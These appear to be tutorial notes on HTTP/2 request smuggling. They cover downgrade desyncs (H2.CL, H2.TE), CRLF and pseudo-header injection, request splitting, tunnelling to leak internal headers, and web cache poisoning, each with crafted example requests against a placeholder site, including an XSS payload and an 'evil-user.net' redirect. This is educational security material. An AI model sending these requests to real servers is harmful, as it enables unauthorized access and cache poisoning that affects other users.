## HTTP/2 request smuggling

### HTTP/2 message length

HTTP/2 messages are sent over the wire as a series of separate "frames". Each frame is preceded by an explicit length field, which tells the server exactly how many bytes to read in. Therefore, the length of the request is the sum of its frame lengths.

In theory, this mechanism means there is no opportunity for an attacker to introduce the ambiguity required for request smuggling, as long as the website uses HTTP/2 end to end. In the wild, however, this is often not the case due to the widespread but dangerous practice of HTTP/2 downgrading.

### HTTP/2 downgrading

HTTP/2 downgrading is the process of rewriting HTTP/2 requests using HTTP/1 syntax to generate an equivalent HTTP/1 request. Web servers and reverse proxies often do this in order to offer HTTP/2 support to clients while communicating with back-end servers that only speak HTTP/1.

### H2.CL vulnerabilities

HTTP/2 requests don't have to specify their length explicitly in a header. During downgrading, this means front-end servers often add an HTTP/1 `Content-Length` header, deriving its value using [HTTP/2's built-in length mechanism](https://portswigger.net/web-security/request-smuggling/advanced#http-2-message-length). Interestingly, HTTP/2 requests can also include their own `content-length` header. In this case, some front-end servers will simply reuse this value in the resulting HTTP/1 request.

The spec dictates that any `content-length` header in an HTTP/2 request must match the length calculated using the built-in mechanism, but this isn't always validated properly before downgrading. As a result, it may be possible to smuggle requests by injecting a misleading `content-length` header. Although the front-end will use the implicit HTTP/2 length to determine where the request ends, the HTTP/1 back-end has to refer to the `Content-Length` header derived from your injected one, resulting in a desync.

In HTTP/2 (front-end):

```http
:method 	POST
:path 	/example
:authority 	vulnerable-website.com
content-type 	application/x-www-form-urlencoded
content-length 	0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```

In HTTP/1 (back-end):

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1GET / H
```

### H2.TE vulnerabilities

Chunked transfer encoding is incompatible with HTTP/2 and the spec recommends that any `transfer-encoding: chunked` header you try to inject should be stripped or the request blocked entirely. If the front-end server fails to do this, and subsequently downgrades the request for an HTTP/1 back-end that does support chunked encoding, this can also enable request smuggling attacks.

```http
:method 	POST
:path 	/example
:authority 	vulnerable-website.com
content-type 	application/x-www-form-urlencoded
transfer-encoding 	chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

## Request smuggling via CRLF injection

In HTTP/1, you can sometimes exploit discrepancies between how servers handle standalone newline (`\n`) characters to smuggle prohibited headers. If the back-end treats this as a delimiter, but the front-end server does not, some front-end servers will fail to detect the second header at all.

`Foo: bar\nTransfer-Encoding: chunked`

This discrepancy doesn't exist with the handling of a full CRLF (`\r\n`) sequence because all HTTP/1 servers agree that this terminates the header.

On the other hand, as HTTP/2 messages are binary rather than text-based, the boundaries of each header are based on explicit, predetermined offsets rather than delimiter characters. This means that `\r\n` no longer has any special significance within a header value and, therefore, can be included **inside** the value itself without causing the header to be split:

foo

bar\r\nTransfer-Encoding: chunked

This may seem relatively harmless on its own, but when this is rewritten as an HTTP/1 request, the `\r\n` will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers:

```http
Foo: bar 
Transfer-Encoding: chunked
```

## HTTP/2-exclusive vectors

## Injecting via header names

In HTTP/1, it's not possible for a header name to contain a colon because this character is used to indicate the end of the name to parsers. This is not the case in HTTP/2.

By combining colons with `\r\n` characters, you may be able to use an HTTP/2 header's name field to sneak other headers past front-end filters. These will then be interpreted as separate headers on the back-end once the request is rewritten using HTTP/1 syntax:

**Front-end (HTTP/2)**

`foo: bar\r\nTransfer-Encoding: chunked\r\nX:`

ignore

**Back-end (HTTP/1)**

```http
Foo: bar\r\n 
Transfer-Encoding: chunked\r\n 
X: ignore\r\n
```

## Injecting via pseudo-headers

HTTP/2 doesn't use a request line or status line. Instead, this data is passed via a series of "pseudo-headers" on the front of the request. In text-based representations of HTTP/2 messages, these are commonly prefixed with a colon to help differentiate them from normal headers. There five pseudo-headers in total:

-   `:method` - The request method.
-   `:path` - The request path. Note that this includes the query string.
-   `:authority` - Roughly equivalent to the HTTP/1 `Host` header.
-   `:scheme` - The request scheme, typically `http` or `https`.
-   `:status` - The response status code (not used in requests).

### Supplying an ambiguous host

Although the HTTP/1 `Host` header is effectively replaced by the `:authority` pseudo-header in HTTP/2, you're still allowed to send a `host` header in the request as well.

In some cases, this may result in two `Host` headers occurring in the rewritten HTTP/1 request, which opens up another possibility for bypassing front-end "duplicate `Host` header" filters, for example. This potentially makes the site vulnerable to a range of [`Host` header attacks](https://portswigger.net/web-security/host-header) to which it may otherwise have been immune.

### Supplying an ambiguous path

Trying to send a request with an ambiguous path is not possible in HTTP/1 due to how the request line is parsed. But as the path in HTTP/2 is specified using a pseudo-header, it's now possible to send a request with two distinct paths as follows:

```
:method 	POST
:path 	/anything
:path 	/admin
:authority 	vulnerable-website.com
```

### Injecting a full request line

During downgrading, the value of the `:method` pseudo-header will be written to the very beginning of the resulting HTTP/1 request. If the server allows you to include spaces in the `:method` value, you may be able to inject an entirely different request line as follows:

**Front-end (HTTP/2)**

```
:method 	GET /admin HTTP/1.1
:path 	/anything
:authority 	vulnerable-website.com
```

**Back-end (HTTP/1)**

```http
GET /admin HTTP/1.1 /anything HTTP/1.1
Host: vulnerable-website.com
```

### Injecting a URL prefix

Another interesting feature of HTTP/2 is the ability to explicitly specify a scheme in the request itself using the `:scheme` pseudo-header. Although this will ordinarily just contain `http` or `https`, you may be able to include arbitrary values.

This can be useful when the server uses the `:scheme` header to dynamically generate a URL, for example. In this case, you could add a prefix to the URL or even override it completely by pushing the real URL into the query string:

**Request**

```
:method 	GET
:path 	/anything
:authority 	vulnerable-website.com
:scheme 	https://evil-user.net/poison?
```

**Response**

```
:status 	301
location 	https://evil-user.net/poison?://vulnerable-website.com/anything/
```

### Injecting newlines into pseudo-headers

When injecting into the `:path` or `:method` pseudo-headers, you need to make sure that the resulting HTTP/1 request still has a valid request line.

As the `\r\n` terminates the request line in HTTP/1, simply adding `\r\n` part way through will just break the request. After downgrading, the rewritten request must contain the following sequence prior to the first `\r\n` that you inject:

`<method> + space + <path> + space + HTTP/1.1`

Just visualize where your injection falls within this sequence and include all of the remaining parts accordingly. For example, when injecting into the `:path`, you need to add a space and `HTTP/1.1` before the `\r\n` as follows:

**Front-end (HTTP/2)**

```http2
:method 	GET
:path 	

/example HTTP/1.1\r\n
Transfer-Encoding: chunked\r\n
X: x
:authority 	vulnerable-website.com
```

**Back-end (HTTP/1)**

```http
GET /example HTTP/1.1\r\n
Transfer-Encoding: chunked\r\n
X: x HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

## HTTP/2 request splitting

When we looked at [response queue poisoning](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning), you learned how to split a single HTTP request into exactly two complete requests on the back-end. In the example we looked at, the split occurred inside the message body, but when HTTP/2 downgrading is in play, you can also cause this split to occur in the headers instead.

This approach is more versatile because you aren't dependent on using request methods that are allowed to contain a body. For example, you can even use a `GET` request:

```http2
:method 	GET
:path 	/
:authority 	vulnerable-website.com
foo 	

bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```

### Accounting for front-end rewriting

To split a request in the headers, you need to understand how the request is rewritten by the front-end server and account for this when adding any HTTP/1 headers manually. Otherwise, one of the requests may be missing mandatory headers.

For example, you need to ensure that both requests received by the back-end contain a `Host` header. Front-end servers typically strip the `:authority` pseudo-header and replace it with a new HTTP/1 `Host` header during downgrading. There are different approaches for doing this, which can influence where you need to position the `Host` header that you're injecting.

Consider the following request:

```http2
:method 	GET
:path 	/
:authority 	vulnerable-website.com
foo 	

bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```

During rewriting, some front-end servers append the new `Host` header to the end of the current list of headers. As far as an HTTP/2 front-end is concerned, this after the `foo` header. Note that this is also after the point at which the request will be split on the back-end. This means that the first request would have no `Host` header at all, while the smuggled request would have two. In this case, you need to position your injected `Host` header so that it ends up in the first request once the split occurs:

```http2
:method 	GET
:path 	/
:authority 	vulnerable-website.com
foo 	

bar\r\n
Host: vulnerable-website.com\r\n
\r\n
GET /admin HTTP/1.1
```

## Leaking internal headers via HTTP/2 request tunnelling

The idea of this technique is that we will send a request to the back-end that won't be captured by the front-end, and the response that the back-end gives us, also won't be captured by the front-end. That means we're likely going to see the results of our attack in stored content. For example, we can inject headers in the comment section and will the response written on the web page.

When request tunnelling is your only option, you won't be able to leak internal headers using the technique we covered in [one of our earlier labs](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting), but HTTP/2 downgrading enables an alternative solution.

You can potentially trick the front-end into appending the internal headers inside what will become a body parameter on the back-end. Let's say we send a request that looks something like this:

```http2
:method 	POST
:path 	/comment
:authority 	vulnerable-website.com
content-type 	application/x-www-form-urlencoded
foo 	bar\r\n
		Content-Length: 200\r\n
		\r\n
		comment=
x=1 
```

```http
POST /comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

comment=X-Internal-Header: secretContent-Length: 3
x=1
```

## Blind request tunnelling

Some front-end servers read in all the data they receive from the back-end. This means that if you successfully tunnel a request, they will potentially forward both responses to the client, with the response to the tunnelled request nested inside the body of the main response.

Other front-end servers only read in the number of bytes specified in the `Content-Length` header of the response, so only the first response is forwarded to the client. This results in a blind request tunnelling vulnerability because you won't be able to see the response to your tunnelled request.

Blind request tunnelling can be tricky to exploit, but you can occasionally make these vulnerabilities non-blind by using `HEAD` requests.

Responses to `HEAD` requests often contain a `content-length` header even though they don't have a body of their own. This normally refers to the length of the resource that would be returned by a `GET` request to the same endpoint. Some front-end servers fail to account for this and attempt to read in the number of bytes specified in the header regardless. If you successfully tunnel a request past a front-end server that does this, this behavior may cause it to over-read the response from the back-end. As a result, the response you receive may contain bytes from the start of the response to your tunnelled request.

```http2
:method 	HEAD
:path 	/example
:authority 	vulnerable-website.com
foo 	bar\r\n
		\r\n
		GET /tunnelled HTTP/1.1\r\n
		Host: vulnerable-website.com\r\n
		X: x
```

```http2
:status 	200
content-type 	text/html
content-length 	131

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 4286

<!DOCTYPE html>
<h1>Tunnelled</h1>
<p>This is a tunnelled respo
```

If the endpoint to which you send your `HEAD` request returns a resource that is shorter than the tunnelled response you're trying to read, it may be truncated before you can see anything interesting, as in the example above. On the other hand, if the returned `content-length` is longer than the response to your tunnelled request, you will likely encounter a timeout as the front-end server is left waiting for additional bytes to arrive from the back-end.

Fortunately, with a bit of trial and error, you can often overcome these issues using one of the following solutions:

-   Point your `HEAD` request to a different endpoint that returns a longer or shorter resource as required.
-   If the resource is too short, use a reflected input in the main `HEAD` request to inject arbitrary padding characters. Even though you won't actually see your input being reflected, the returned `content-length` will still increase accordingly.
-   If the resource is too long, use a reflected input in the tunnelled request to inject arbitrary characters so that the length of the tunnelled response matches or exceeds the length of the expected content.

## Web cache poisoning via HTTP/2 request tunnelling

Even though request tunnelling is generally more limited than classic request smuggling, you can sometimes still construct high-severity attacks. For example, you may be able to combine the request tunnelling techniques we've looked at so far for an extra-powerful form of web cache poisoning.

With non-blind request tunnelling, you can effectively mix and match the headers from one response with the body of another. If the response in the body reflects unencoded user input, you may be able to leverage this behavior for [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) in contexts where the browser would not normally execute the code.

For example, the following response contains unencoded, attacker-controllable input:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{ "name" : "test<script>alert(1)</script>" }
[etc.]
```

By itself, this is relatively harmless. The `Content-Type` means that this payload will simply be interpreted as JSON by the browser. But consider what would happen if you tunnel the request to the back-end instead. This response would appear inside the body of a different response, effectively inheriting its headers, including the `content-type`.

```http2
:status 	200
content-type 	text/html
content-length 	174

HTTP/1.1 200 OK
Content-Type: application/json

{ "name" : "test<script>alert(1)</script>" }
[etc.]
```